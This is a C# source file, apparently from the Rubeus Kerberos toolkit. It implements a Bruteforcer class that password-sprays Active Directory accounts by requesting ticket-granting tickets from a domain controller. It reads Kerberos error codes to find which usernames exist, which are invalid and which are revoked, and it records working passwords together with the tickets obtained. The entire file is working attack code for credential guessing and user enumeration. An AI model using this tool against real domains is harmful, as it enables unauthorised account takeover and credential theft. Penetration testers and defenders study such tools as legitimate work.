using System;
using System.Collections.Generic;

namespace Rubeus
{

    public interface IBruteforcerReporter
    {
        void ReportValidPassword(string domain, string username, string password, byte[] ticket);
        void ReportValidUser(string domain, string username);
        void ReportInvalidUser(string domain, string username);
        void ReportBlockedUser(string domain, string username);
        void ReportKrbError(string domain, string username, KRB_ERROR krbError);
    }


    public class Bruteforcer
    {

        private string domain;
        private string dc;
        private IBruteforcerReporter reporter;
        private Dictionary<string, bool> invalidUsers;
        private Dictionary<string, bool> validUsers;
        private Dictionary<string, string> validCredentials;

        public Bruteforcer(string domain, string domainController, IBruteforcerReporter reporter)
        {
            this.domain = domain;
            this.dc = domainController;
            this.reporter = reporter;
            this.invalidUsers = new Dictionary<string, bool>();
            this.validUsers = new Dictionary<string, bool>();
            this.validCredentials = new Dictionary<string, string>();
        }

        public bool Attack(string[] usernames, string[] passwords)
        {
            bool success = false;
            foreach (string password in passwords)
            {
                foreach (string username in usernames)
                {
                    if(this.TestUsernamePassword(username, password))
                    {
                        success = true;
                    }
                }
            }

            return success;
        }

        private bool TestUsernamePassword(string username, string password)
        {
            try
            {
                if (!invalidUsers.ContainsKey(username) && !validCredentials.ContainsKey(username))
                {
                    this.GetUsernamePasswordTGT(username, password);
                    return true;
                }
            }
            catch (KerberosErrorException ex)
            {
                this.HandleKerberosError(ex, username);
            }

            return false;
        }

        private void GetUsernamePasswordTGT(string username, string password)
        {
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            string salt = String.Format("{0}{1}", domain.ToUpper(), username.ToLower());

            // special case for computer account salts
            if (username.EndsWith("$"))
            {
                salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), username.TrimEnd('$').ToLower(), domain.ToLower());
            }

            string hash = Crypto.KerberosPasswordHash(encType, password, salt);

            AS_REQ unpwAsReq = AS_REQ.NewASReq(username, domain, hash, encType);

            byte[] TGT = Ask.InnerTGT(unpwAsReq, encType, null, false, this.dc);

            this.ReportValidPassword(username, password, TGT);
        }

        private void HandleKerberosError(KerberosErrorException ex, string username)
        {
            

            KRB_ERROR krbError = ex.krbError;

            switch ((Interop.KERBEROS_ERROR)krbError.error_code)
            {
                case Interop.KERBEROS_ERROR.KDC_ERR_PREAUTH_FAILED:
                    this.ReportValidUser(username);
                    break;

                case Interop.KERBEROS_ERROR.KDC_ERR_C_PRINCIPAL_UNKNOWN:
                    this.ReportInvalidUser(username);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_CLIENT_REVOKED:
                    this.ReportBlockedUser(username);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_ETYPE_NOTSUPP:
                    this.ReportInvalidEncryptionType(username, krbError);
                    break;
                default:
                    this.ReportKrbError(username, krbError);
                    throw ex;
            }
        }

        private void ReportValidPassword(string username, string password, byte[] ticket)
        {

            validCredentials.Add(username, password);
            if (!validUsers.ContainsKey(username))
            {
                validUsers.Add(username, true);
            }
            this.reporter.ReportValidPassword(this.domain, username, password, ticket);
        }

        private void ReportValidUser(string username)
        {
            if (!validUsers.ContainsKey(username))
            {
                validUsers.Add(username, true);
                this.reporter.ReportValidUser(this.domain, username);
            }
        }

        private void ReportInvalidUser(string username)
        {
            if (!invalidUsers.ContainsKey(username))
            {
                invalidUsers.Add(username, true);
                this.reporter.ReportInvalidUser(this.domain, username);
            }
        }

        private void ReportBlockedUser(string username)
        {
            if (!invalidUsers.ContainsKey(username))
            {
                invalidUsers.Add(username, true);
                this.reporter.ReportBlockedUser(this.domain, username);
            }
        }

        private void ReportInvalidEncryptionType(string username, KRB_ERROR krbError)
        {
            if (!invalidUsers.ContainsKey(username))
            {
                invalidUsers.Add(username, true);
                this.ReportKrbError(username, krbError);
            }
        }

        private void ReportKrbError(string username, KRB_ERROR krbError)
        {
            this.reporter.ReportKrbError(this.domain, username, krbError);
        }

    }
}
